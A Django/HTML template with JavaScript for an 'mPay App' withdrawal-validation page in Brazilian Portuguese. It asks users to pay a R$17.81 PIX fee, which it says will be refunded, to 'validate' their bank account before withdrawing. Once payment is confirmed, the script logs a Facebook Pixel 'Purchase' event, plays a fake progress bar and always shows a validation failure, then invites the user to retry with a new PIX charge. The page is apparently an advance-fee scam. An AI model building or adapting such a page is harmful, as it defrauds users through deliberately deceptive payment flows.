{% load theming %}
{% load static %}
{% load tracking_tags %}
<!DOCTYPE html>
<html lang="pt-br">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="description" content="mpay" />
  <meta name="keywords" content="mpay" />
  <meta name="author" content="mpay" />
  <link rel="manifest" href="{% static 'manifest.json' %}" />
  <link rel="icon" href="{% themed_static 'images/logo/favicon.png' %}" type="image/x-icon" />
  <title>mPay App - Validação de saque</title>
  <link rel="apple-touch-icon" href="{% themed_static 'images/logo/favicon.png' %}" />
  <meta name="theme-color" content="#122636" />
  <meta name="apple-mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-status-bar-style" content="black" />
  <meta name="apple-mobile-web-app-title" content="mpay" />
  <meta name="msapplication-TileImage" content="{% themed_static 'images/logo/favicon.png' %}" />
  <meta name="msapplication-TileColor" content="#FFFFFF" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />

  {% tracking_head %}

  <!-- Google font -->
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link
    href="https://fonts.googleapis.com/css2?family=Lato:wght@100;300;400;700;900&display=swap"
    rel="stylesheet" />

  <!-- bootstrap css -->
  <link rel="stylesheet" id="rtl-link" type="text/css"
        href="{% themed_static 'css/vendors/bootstrap.min.css' %}" />

  <!-- swiper css -->
  <link rel="stylesheet" type="text/css"
        href="{% themed_static 'css/vendors/swiper-bundle.min.css' %}" />

  <!-- Theme css -->
  <link rel="stylesheet" id="change-link" type="text/css"
        href="{% themed_static 'css/style.css' %}" />

  <!-- QRCode lib -->
  <script
    src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"
    defer></script>

  <style>
    .validation-icon {
      font-size: 48px;
      color: #4caf50;
      margin-bottom: 16px;
    }

    .validation-subtitle {
      margin-top: 4px;
      color: #6c757d;
      font-size: 0.95rem;
    }

    .qr-code-img,
    #qrcode {
      display: block;
      margin: 20px auto;
      width: 220px;
      height: 220px;
    }

    #pix-amount,
    #timer {
      font-size: 1.1rem;
      font-weight: 700;
      display: block;
      text-align: center;
      margin: 10px 0;
      color: #122636;
    }

    .pix-code {
      width: 100%;
      padding: 12px;
      margin: 12px 0 6px 0;
      border: 1px solid #dee2e6;
      border-radius: 8px;
      background-color: #f8f9fa;
      color: #122636;
      text-align: center;
      font-size: 0.9rem;
      word-break: break-all;
    }

    .pix-helper-text {
      font-size: 0.85rem;
      color: #6c757d;
      text-align: center;
      margin-top: 4px;
    }

    /* Loading overlay “Gerando PIX...” */
    .loading-overlay {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.8);
      z-index: 1050;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      color: #fff;
      animation: fadeIn 0.3s ease-in-out;
    }

    .loading-overlay.active {
      display: flex;
    }

    @keyframes fadeIn {
      from {
        opacity: 0;
      }

      to {
        opacity: 1;
      }
    }

    .spinner {
      border: 6px solid rgba(255, 255, 255, 0.3);
      border-top: 6px solid #4caf50;
      border-radius: 50%;
      width: 56px;
      height: 56px;
      animation: spin 1s linear infinite;
      margin-bottom: 16px;
    }

    @keyframes spin {
      0% {
        transform: rotate(0deg);
      }

      100% {
        transform: rotate(360deg);
      }
    }

    #loading-message {
      font-size: 1rem;
      font-weight: 600;
    }

    /* Modal overlay estilo Nubank-ish */
    .modal-overlay {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.6);
      z-index: 1060;
      justify-content: center;
      align-items: center;
    }

    .modal-overlay.active {
      display: flex;
    }

    .mpay-modal-card {
      background: #222223;
      color: #fff;
      border-radius: 16px;
      padding: 24px;
      text-align: center;
      max-width: 320px;
      width: 90%;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
      animation: scaleIn 0.25s ease-out;
    }

    @keyframes scaleIn {
      from {
        transform: scale(0.95);
        opacity: 0;
      }

      to {
        transform: scale(1);
        opacity: 1;
      }
    }

    .modal-title {
      font-size: 1.3rem;
      font-weight: 700;
      margin-bottom: 8px;
      color: #fff;
    }

    .modal-description {
      font-size: 0.9rem;
      color: #e9ecef;
      margin-bottom: 16px;
    }

    .modal-spinner {
      border: 6px solid rgba(76, 175, 80, 0.2);
      border-top: 6px solid #4caf50;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
      margin: 0 auto 16px;
    }

    .progress-bar-container {
      width: 100%;
      height: 6px;
      background: #343a40;
      border-radius: 999px;
      overflow: hidden;
      margin-top: 10px;
    }

    .progress {
      height: 100%;
      width: 0;
      background: linear-gradient(90deg, #4caf50, #66bb6a);
    }

    /* Página de falha */
    #failure-page {
      display: none;
      padding: 32px 0;
    }

    .failure-card {
      text-align: center;
    }

    .failure-icon {
      width: 56px;
      height: 56px;
      border-radius: 999px;
      background: rgba(220, 53, 69, 0.1);
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 12px;
      color: #dc3545;
      font-size: 1.8rem;
    }

    .failure-title {
      font-size: 1.4rem;
      font-weight: 700;
      color: #dc3545;
      margin-bottom: 8px;
    }

    .failure-text {
      font-size: 0.95rem;
      color: #6c757d;
      margin-bottom: 18px;
    }

    .btn-secondary-light {
      background-color: #e9ecef;
      color: #122636;
      border-radius: 999px;
      padding: 10px 16px;
      font-weight: 600;
      border: none;
      width: 100%;
    }

    .btn-secondary-light:hover {
      background-color: #dde2e6;
    }

    /* Pequeno ajuste de espaçamento nos steps */
    .step-block {
      margin-bottom: 24px;
    }

    .step-block h3 {
      font-size: 1.3rem;
      margin-bottom: 8px;
    }

    .step-block p {
      font-size: 0.95rem;
      color: #6c757d;
      margin-bottom: 0;
    }
  </style>
</head>

<body class="auth-body">
  <!-- header start (estilo auth) -->
  <div class="auth-header">
    <a href="{% url 'core:withdraw_balance' %}">
      <i class="back-btn" data-feather="arrow-left"></i>
    </a>

    <div class="auth-content">
      <div>
        <h2>Validação de saque</h2>
        <h4 class="p-0 validation-subtitle">
          Valide sua conta bancária para concluir o saque com segurança.
        </h4>
      </div>
    </div>
  </div>
  <!-- header end -->

  <!-- conteúdo principal -->
  <div class="auth-form">
    <div class="custom-container wrap-boarding">
      {% if validation_status == "pix_created" %}
      <!-- Já existe um PIX criado para este usuário -->
      <div id="pix-step" style="display: block;">
        <div class="form-group text-center">
          <div class="validation-icon">
            <i class="icon" data-feather="credit-card"></i>
          </div>
          <h3>Realize o pagamento via PIX</h3>
          <p class="validation-subtitle">
            Escaneie o QR Code ou copie o código PIX para concluir a validação.
          </p>

          <div id="pix-content">
            <div id="qrcode" class="qr-code-img"></div>

            <span id="pix-amount">
              R$
              {{ pix_transaction.amount|default:pix_config.amount|floatformat:2|default:"17.81"|stringformat:".2f"|cut:"."|slice:":-2" }}
            </span>

            <input type="text"
                   readonly
                   value="{{ pix_transaction.qr_code|default:'' }}"
                   id="pixcode"
                   class="pix-code" />

            <button type="button"
                    onclick="copyToClipboard(this)"
                    class="btn theme-btn w-100 mt-2 styled-button small">
              Copiar código PIX
            </button>

            <p class="pix-helper-text">
              Tempo restante para validação:
              <span id="timer">09:59</span>
            </p>
          </div>
        </div>
      </div>

      {% elif validation_status == "payment_reported" %}
      <!-- Pagamento já foi reportado / está em verificação -->
      <div id="payment-reported" style="display: block;">
        <div class="form-group text-center">
          <div class="validation-icon">
            <i class="icon" data-feather="clock"></i>
          </div>
          <h3>Verificando pagamento...</h3>
          <p class="validation-subtitle">
            Aguardando confirmação da validação via PIX. Isso pode levar até 25 minutos.
          </p>

          {% if pix_transaction and pix_transaction.paid_at %}
          <p class="mt-3">
            <strong>Pagamento confirmado em:</strong>
            {{ pix_transaction.paid_at|date:"d/m/Y H:i" }}
          </p>
          <p class="validation-subtitle">
            Seu pagamento foi registrado e está sendo processado.
          </p>
          {% else %}
          <div class="spinner" style="margin: 24px auto;"></div>
          {% endif %}

          <form method="post" action="{% url 'core:reset_validation' %}">
            {% csrf_token %}
            <button type="submit" class="btn theme-btn w-100 mt-3">
              Reiniciar verificação
            </button>
          </form>
        </div>
      </div>

      {% else %}
      <!-- Fluxo completo em 3 passos + tela de PIX -->
      <!-- Step 1 -->
      <div id="full-step1" class="step-block" style="display: block;">
        <div class="form-group text-center">
          <div class="validation-icon">
            <i class="icon" data-feather="user-check"></i>
          </div>
          <h3>Você precisa validar sua conta</h3>
          <p class="validation-subtitle">
            Para continuar com seu saque, é necessário validar sua conta bancária.
          </p>
          <p class="validation-subtitle mt-2">
            Notamos que esse será o seu primeiro saque. Para adicionar uma nova chave PIX com segurança,
            precisamos fazer uma validação rápida.
          </p>
        </div>

        <button type="button"
                class="btn theme-btn w-100 mt-2"
                onclick="nextStep(2)">
          Próximo
        </button>
      </div>

      <!-- Step 2 -->
      <div id="full-step2" class="step-block" style="display: none;">
        <div class="form-group text-center">
          <div class="validation-icon">
            <i class="icon" data-feather="dollar-sign"></i>
          </div>
          <h3>Detalhes do pagamento</h3>
          <p class="validation-subtitle">
            Para validar sua conta bancária, será gerado um PIX no valor de
            <strong>R$ {{ pix_config.amount|default:'17.81' }}</strong>.
          </p>
          <p class="validation-subtitle mt-2">
            Esse valor será reembolsado após a confirmação, e serve apenas para
            confirmar a titularidade da sua conta.
          </p>
        </div>

        <button type="button"
                class="btn theme-btn w-100 mt-2"
                onclick="nextStep(3)">
          Próximo
        </button>
      </div>

      <!-- Step 3 -->
      <div id="full-step3" class="step-block" style="display: none;">
        <div class="form-group text-center">
          <div class="validation-icon">
            <i class="icon" data-feather="shield"></i>
          </div>
          <h3>Processo rápido e seguro</h3>
          <p class="validation-subtitle">
            Este processo valida sua conta bancária e garante que seus saques sejam
            feitos de forma segura.
          </p>
          <p class="validation-subtitle mt-2">
            Quando estiver pronto, clique em <strong>Iniciar validação</strong> para gerar
            o PIX de confirmação.
          </p>
        </div>

        <button type="button"
                class="btn theme-btn w-100 mt-2"
                onclick="initiatePixGeneration()">
          Iniciar validação
        </button>
      </div>

      <!-- PIX Step (é preenchido via JS depois do POST) -->
      <div id="pix-step" style="display: none;">
        <div class="form-group text-center">
          <div class="validation-icon">
            <i class="icon" data-feather="credit-card"></i>
          </div>
          <h3>Realize o pagamento via PIX</h3>
          <p class="validation-subtitle">
            Escaneie o QR Code ou copie o código PIX para concluir a validação.
          </p>

          <div id="pix-content"></div>
        </div>
      </div>
      {% endif %}
    </div>
  </div>

  <!-- Página de falha (após "validação" no polling) -->
  <div class="auth-form" id="failure-page">
    <div class="custom-container">
      <div class="failure-card">
        <div class="failure-icon">
          <i class="icon" data-feather="x"></i>
        </div>
        <h3 class="failure-title">A validação falhou</h3>
        <p class="failure-text">
          Identificamos sua tentativa de validação, mas não foi possível confirmar a
          titularidade da sua conta bancária.
        </p>
        <p class="failure-text">
          Você pode tentar novamente clicando no botão abaixo.
        </p>

        <button type="button"
                class="btn theme-btn w-100 mt-2"
                onclick="retryValidation()">
          Tentar novamente
        </button>

        <button type="button"
                class="btn-secondary-light mt-2"
                onclick="window.location.href='{% url 'core:home' %}'">
          Voltar para a tela inicial
        </button>
      </div>
    </div>
  </div>

  <!-- Loading Overlay (Gerando PIX...) -->
  <div class="loading-overlay" id="loading-overlay">
    <div class="spinner"></div>
    <p id="loading-message">Gerando PIX...</p>
  </div>

  <!-- Modal de "Carregando..." (depois que o PIX é autorizado) -->
  <div class="modal-overlay" id="loading-modal">
    <div class="mpay-modal-card">
      <div class="modal-spinner"></div>
      <div class="modal-title">Carregando...</div>
      <p class="modal-description">
        Aguardando confirmação do pagamento.
      </p>
    </div>
  </div>

  <!-- Modal de "Validando conta..." (barra de progresso) -->
  <div class="modal-overlay" id="validating-modal">
    <div class="mpay-modal-card">
      <div class="validation-icon" style="margin-bottom: 8px;">
        <i class="icon" data-feather="settings"></i>
      </div>
      <div class="modal-title">Validando conta...</div>
      <p class="modal-description">
        Isso pode levar alguns segundos.
      </p>
      <div class="progress-bar-container">
        <div class="progress" id="progress-fill"></div>
      </div>
    </div>
  </div>

  <!-- feather js -->
  <script src="{% themed_static 'js/feather.min.js' %}"></script>
  <script src="{% themed_static 'js/custom-feather.js' %}"></script>

  <!-- bootstrap js -->
  <script src="{% themed_static 'js/bootstrap.bundle.min.js' %}"></script>

  <!-- jQuery -->
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

  <script>
    function nextStep(step) {
      ['full-step1', 'full-step2', 'full-step3', 'pix-step'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.style.display = 'none';
      });
      const target = document.getElementById(`full-step${step}`);
      if (target) {
        target.style.display = 'block';
      } else {
        alert('Erro: etapa não encontrada. Recarregue a página.');
      }
    }

    function canGeneratePix() {
      let count = parseInt(localStorage.getItem('pixGenerationCount') || '0');
      let lastTime = parseInt(localStorage.getItem('lastPixGenerationTime') || '0');
      let now = Date.now();
      return count < 3 && (now - lastTime > 300000);  // 5 minutos
    }

    function showGenerateButton() {
      let count = parseInt(localStorage.getItem('pixGenerationCount') || '0');
      if (count >= 3) return;

      const pixContent = document.getElementById('pix-content');
      if (!pixContent) return;

      if (!pixContent.querySelector('button[onclick="generateNewPix()"]')) {
        const button = document.createElement('button');
        button.type = 'button';
        button.className = 'btn theme-btn w-100 mt-2';
        button.onclick = generateNewPix;
        button.innerText = 'Gerar novo PIX';

        const timerP = document.getElementById('timer') ?
          document.getElementById('timer').parentNode : null;

        if (timerP) {
          pixContent.insertBefore(button, timerP);
        } else {
          pixContent.appendChild(button);
        }
      }
    }

    function initiatePixGeneration() {
      const loadingOverlay = document.getElementById('loading-overlay');
      const pixStep = document.getElementById('pix-step');
      const pixContent = document.getElementById('pix-content');

      if (!pixStep || !pixContent) {
        alert('Erro: interface de PIX não encontrada. Recarregue a página.');
        return;
      }

      loadingOverlay.classList.add('active');

      fetch("{% url 'core:withdraw_validation' %}", {
        method: 'POST',
        headers: {
          'X-CSRFToken': '{{ csrf_token }}',
          'X-Requested-With': 'XMLHttpRequest'
        }
      })
        .then(response => response.text())
        .then(text => {
          let data;
          try {
            data = JSON.parse(text);
          } catch (e) {
            throw new Error('Resposta inválida do servidor');
          }

          loadingOverlay.classList.remove('active');

          if (data.status === 'success') {
            if (typeof fbq !== 'undefined') {
              try { fbq('track', 'InitiateCheckout'); } catch (e) { }
            }

            // some todos os steps e mostra apenas o de PIX
            ['full-step1', 'full-step2', 'full-step3'].forEach(id => {
              const el = document.getElementById(id);
              if (el) el.style.display = 'none';
            });
            pixStep.style.display = 'block';

            let count = parseInt(localStorage.getItem('pixGenerationCount') || '0');
            localStorage.setItem('pixGenerationCount', count + 1);
            localStorage.setItem('lastPixGenerationTime', Date.now());

            pixContent.innerHTML = `
              <div id="qrcode" class="qr-code-img"></div>
              <span id="pix-amount">R$ ${data.amount.toFixed(2).replace('.', ',')}</span>
              <input type="text" readonly value="${data.qr_code}" id="pixcode" class="pix-code" />
              <button type="button" onclick="copyToClipboard(this)" class="btn theme-btn w-100 mt-2 styled-button small">
                Copiar código PIX
              </button>
              <p class="pix-helper-text">
                Tempo restante para validação: <span id="timer">09:59</span>
              </p>
            `;

            renderQR('qrcode', data.qr_code);
            startPolling();
            setTimeout(showGenerateButton, 300000);
          } else {
            alert(data.message || 'Erro ao gerar PIX. Tente novamente.');
          }
        })
        .catch(error => {
          loadingOverlay.classList.remove('active');
          alert('Erro ao processar a requisição: ' + error.message);
        });
    }

    function generateNewPix() {
      if (!canGeneratePix()) {
        alert('Você pode gerar um novo PIX apenas a cada 5 minutos e no máximo 3 vezes.');
        return;
      }

      const loadingOverlay = document.getElementById('loading-overlay');
      const pixStep = document.getElementById('pix-step');
      const pixContent = document.getElementById('pix-content');

      if (!pixStep || !pixContent) {
        alert('Erro: interface de PIX não encontrada. Recarregue a página.');
        return;
      }

      ['full-step1', 'full-step2', 'full-step3'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.style.display = 'none';
      });
      pixStep.style.display = 'block';

      loadingOverlay.classList.add('active');

      fetch("{% url 'core:withdraw_validation' %}", {
        method: 'POST',
        headers: {
          'X-CSRFToken': '{{ csrf_token }}',
          'X-Requested-With': 'XMLHttpRequest'
        }
      })
        .then(response => response.text())
        .then(text => {
          let data;
          try {
            data = JSON.parse(text);
          } catch (e) {
            throw new Error('Resposta inválida do servidor');
          }

          loadingOverlay.classList.remove('active');

          if (data.status === 'success') {
            if (typeof fbq !== 'undefined') {
              try { fbq('track', 'InitiateCheckout'); } catch (e) { }
            }

            let count = parseInt(localStorage.getItem('pixGenerationCount') || '0');
            localStorage.setItem('pixGenerationCount', count + 1);
            localStorage.setItem('lastPixGenerationTime', Date.now());

            pixContent.innerHTML = `
              <div id="qrcode" class="qr-code-img"></div>
              <span id="pix-amount">R$ ${data.amount.toFixed(2).replace('.', ',')}</span>
              <input type="text" readonly value="${data.qr_code}" id="pixcode" class="pix-code" />
              <button type="button" onclick="copyToClipboard(this)" class="btn theme-btn w-100 mt-2 styled-button small">
                Copiar código PIX
              </button>
              <p class="pix-helper-text">
                Tempo restante para validação: <span id="timer">09:59</span>
              </p>
            `;

            renderQR('qrcode', data.qr_code);
            startPolling();
            setTimeout(showGenerateButton, 300000);
          } else {
            alert(data.message || 'Erro ao gerar novo PIX. Tente novamente.');
          }
        })
        .catch(error => {
          loadingOverlay.classList.remove('active');
          alert('Erro ao processar a requisição: ' + error.message);
        });
    }

    function copyToClipboard(button) {
      const pixCode = document.getElementById('pixcode');
      if (!pixCode) {
        alert('Erro: campo de código PIX não encontrado.');
        return;
      }

      pixCode.select();
      document.execCommand('copy');
      button.innerText = 'Código copiado!';
      setTimeout(() => { button.innerText = 'Copiar código PIX'; }, 3000);

      const key = 'apinfo_sent_once';
      if (localStorage.getItem(key)) return;

      fetch("{% url 'core:track_add_payment_info' %}", {
        method: 'POST',
        headers: {
          'X-CSRFToken': '{{ csrf_token }}',
          'X-Requested-With': 'XMLHttpRequest'
        }
      })
        .then(resp => resp.text())
        .then(() => {
          localStorage.setItem(key, '1');
        })
        .catch(() => {
          try { localStorage.setItem(key, '1'); } catch (e) { }
        });
    }

    function retryValidation() {
      fetch("{% url 'core:reset_validation' %}", {
        method: 'POST',
        headers: {
          'X-CSRFToken': '{{ csrf_token }}',
          'X-Requested-With': 'XMLHttpRequest'
        }
      })
        .then(response => {
          if (!response.ok) throw new Error('Erro ao reiniciar validação');
          return response.json();
        })
        .then(data => {
          if (data.status === 'success') {
            localStorage.removeItem('pixGenerationCount');
            localStorage.removeItem('lastPixGenerationTime');

            document.getElementById('failure-page').style.display = 'none';

            const wrapBoarding = document.querySelector('.wrap-boarding');
            if (wrapBoarding) wrapBoarding.style.display = 'block';

            // Reinicia fluxo no step 1
            ['full-step1', 'full-step2', 'full-step3', 'pix-step'].forEach(id => {
              const el = document.getElementById(id);
              if (el) el.style.display = 'none';
            });
            const s1 = document.getElementById('full-step1');
            if (s1) s1.style.display = 'block';
          }
        })
        .catch(() => {
          alert('Erro ao reiniciar a validação.');
        });
    }

    function startPolling() {
      const interval = setInterval(() => {
        fetch('/check-pix-status/', {
          method: 'GET',
          headers: { 'X-Requested-With': 'XMLHttpRequest' }
        })
          .then(response => response.json())
          .then(data => {
            if (['AUTHORIZED', 'CONFIRMED', 'RECEIVED'].includes(data.status)) {
              if (typeof fbq !== 'undefined') {
                try { fbq('track', 'Purchase', { value: 17.81, currency: 'BRL' }); } catch (e) { }
              }

              clearInterval(interval);

              const pixContent = document.getElementById('pix-content');
              if (pixContent) pixContent.classList.add('hidden');

              const wrapBoarding = document.querySelector('.wrap-boarding');
              if (wrapBoarding) wrapBoarding.style.display = 'none';

              const loadingModal = document.getElementById('loading-modal');
              loadingModal.classList.add('active');

              setTimeout(() => {
                loadingModal.classList.remove('active');

                const validatingModal = document.getElementById('validating-modal');
                validatingModal.classList.add('active');
                const progressFill = document.getElementById('progress-fill');
                animateProgressBar(progressFill, 15000);

                setTimeout(() => {
                  validatingModal.classList.remove('active');
                  document.getElementById('failure-page').style.display = 'block';
                }, 15000);
              }, 3000);
            }
          })
          .catch(err => {
            console.warn('Erro no polling PIX:', err);
          });
      }, 2000);
    }

    function animateProgressBar(progressElement, duration) {
      if (!progressElement) return;
      let start = null;

      function step(timestamp) {
        if (!start) start = timestamp;
        const elapsed = timestamp - start;
        const percent = Math.min((elapsed / duration) * 100, 100);
        progressElement.style.width = percent + '%';
        if (elapsed < duration) {
          requestAnimationFrame(step);
        }
      }

      requestAnimationFrame(step);
    }

    // Contador de 10 minutos (para o texto do timer)
    let countdown = 600;
    setInterval(() => {
      if (countdown > 0) countdown--;
      const minutes = String(Math.floor(countdown / 60)).padStart(2, '0');
      const seconds = String(countdown % 60).padStart(2, '0');
      const timerEl = document.getElementById('timer');
      if (timerEl) timerEl.innerText = `${minutes}:${seconds}`;
    }, 1000);

    function renderQR(targetId, payload) {
      const el = document.getElementById(targetId);
      if (!el || !payload || typeof QRCode === 'undefined') return;

      el.innerHTML = '';
      new QRCode(el, {
        text: payload,
        width: 220,
        height: 220,
        correctLevel: QRCode.CorrectLevel.M
      });
    }

    document.addEventListener('DOMContentLoaded', function () {
      // Se já existir um PIX (branch validation_status == "pix_created"), renderiza o QR na tela
      const existingPix = "{{ pix_transaction.qr_code|default:'' }}";
      if (existingPix) renderQR('qrcode', existingPix);

      // Se já existir PIX na tela e der tempo, mostra botão de gerar novo (respeitando limites)
      showGenerateButton();
    });
  </script>

  {% tracking_body_end %}
</body>

</html>
